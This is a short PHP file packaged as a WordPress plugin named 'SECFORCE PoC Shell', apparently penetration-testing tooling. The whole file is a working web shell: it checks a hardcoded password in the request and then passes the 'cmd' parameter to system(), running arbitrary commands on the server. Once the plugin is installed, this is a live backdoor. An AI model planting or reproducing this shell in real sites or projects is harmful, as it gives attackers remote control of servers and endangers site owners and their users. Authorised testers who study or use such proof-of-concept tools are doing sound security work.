<?php
    /*
    Plugin Name: SECFORCE PoC Shell
    Plugin URI: https://secforce.com
    Description: Just a easy shell
    Author: borch
    Version: 0.1
    Author URI: https://secforce.com
    */

 
 if(isset($_REQUEST['cmd']) && isset($_REQUEST['pass'])){
	if ($_REQUEST['pass'] == "mak3ithapp3n"){
		$cmd = $_REQUEST['cmd'];
		system($cmd);
		die;
	}
}
?>
